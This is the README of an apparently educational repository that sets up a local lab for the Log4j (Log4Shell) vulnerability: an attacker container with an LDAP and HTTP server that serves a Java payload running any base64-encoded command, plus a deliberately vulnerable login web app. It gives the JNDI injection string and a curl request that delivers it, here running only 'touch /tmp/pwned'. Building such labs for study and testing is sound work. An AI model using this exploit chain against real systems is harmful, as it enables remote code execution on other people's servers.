## Log4j self contained attacker node and vulnerable webapp
This repo ultimately builds a container that has a LDAP server that references itself to deliver a malicious java payload over HTTP. The payload is compiled from source when the container is built. When the LDAP server receives a base64 encoded request, it edits the already compiled class file to decode the requested command into it, allowing any command to be specified by the attacker in base 64.

This repo also contains a web app that is built and started on port 80 as part of the docker compose file, but listening in the container on 8080

## Usage Instructions

Build and start the containers
```
docker-compose up
```

As docker-compose manages the networking between the attacker container and the vulnerable web app, you can reference the attacker by using the hostname "attacker", it will always resolve to the IP that docker assigns it. The address assigned might vary from system to system.

If you navigate to the IP address of the server in your web browser, you will be presented a vulnerable login form, the username field is vulnerable to the log4j exploit.
```
# Paste the following string in the username field and click submit
# The Base64 in this request decodes to touch /tmp/pwned
${jndi:ldap://attacker:1389/b64/dG91Y2ggL3RtcC9wd25lZA==}
```

You can also initiate the attack from inside the vulnerable web app container using curl
```
# The Base64 in this request decodes to touch /tmp/pwned
curl -X POST http://localhost:8080/login -H 'Content-Type: application/json' -d '{"username":"${jndi:ldap://attacker:1389/b64/dG91Y2ggL3RtcC9wd25lZA==}","password":"password"}'
```

## Optional environment Variables for attacker container
Ports and IP, if these are changed, docker commands will have to reference the new ports.
Do not change these if deploying from docker-compose, these are listed for other installs only

- L4J_LDAP_PORT (Port LDAP listens on, default 1389)
- L4J_HTTP_PORT (Port Http listens on, default 8888)
- L4J_LOCAL_IP (IP of the attacker node as seen by web app)